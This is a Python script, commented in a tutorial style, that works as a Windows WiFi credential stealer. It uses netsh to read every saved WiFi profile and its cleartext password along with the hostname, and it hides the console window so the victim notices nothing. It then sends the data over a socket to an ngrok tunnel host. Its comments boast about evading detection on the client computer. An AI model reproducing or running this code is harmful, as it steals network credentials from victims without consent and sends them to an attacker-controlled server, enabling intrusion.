# The program has two different methods of connection, Method 1 and 2.
# Subprocess allows the program to run commands through windows built in command console
# socket and ngrok are what allows the programs to connect and send information to each other
import subprocess
import socket
import ngrok

# Look aroun line 36 for the place to put the string of numbers from the server

# results2 is created as a blank string variable
# the CREATE_NO_WINDOW variable is created which contains a code that when Windows reads it prevents
# Windows from creating a window of what commands are being run, preventing the client computer from
# detecting anything malicious
results2 = ""
CREATE_NO_WINDOW = 0x08000000

# uses subprocess to run the commands that look for the wifi names and the system name
# using CREATE_NO_WINDOW to prevent the console from being created and then decoding them from utf-8
wifiCommand = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
systemNameCommand = subprocess.check_output(['hostname'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')

# attempts to print the name of the system, which if the system name doesn't exist it won't break and
# will instead output that the system name is unavailable, preventing errors.
try:
    print(systemNameCommand[0])
    results2 = "System Name: " + systemNameCommand[0] + "\n"
except:
    results2 = "SYSTEM NAME UNAVAILABLE" + "\n"


# adds a title to results2
results2 += "WiFi Results\n"

# uses the wifi names to get the wifi passwords using more commands, and then makes it readable
# for when it is outputted using formatting
profiles = [i.split(":")[1][1:-1] for i in wifiCommand if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], creationflags=CREATE_NO_WINDOW).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
        print ("{:<50}|  {:<}".format(i, results[0]))
        results2 += "{:<50}|  {:<}".format(i, results[0])
        results2 += "\n"
    except IndexError:
        print ("{:<50}|  {:<}".format(i, ""))

# prints out the results for testing, doesn't actually show up on client computer, and then sets up
# the socket for the connection of server and client
print(results2)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# METHOD 1
try:
    # Connect to the listening server address, this is where you change the id for server and client connection.
    client_socket.connect(('0.tcp.au.ngrok.io', 19030))
    
    # Send the encoded data payload
    client_socket.sendall(results2.encode('utf-8'))

# METHOD 2
except:
    print("Connect error occurred. Attempt to open alternate.")
    client_socket.connect(('127.0.0.1', 8080))
    client_socket.sendall(results2.encode('utf-8'))

# closes program once done to make sure the program only runs for about 10 seconds, making it much
# harder to detect
finally:
    client_socket.close()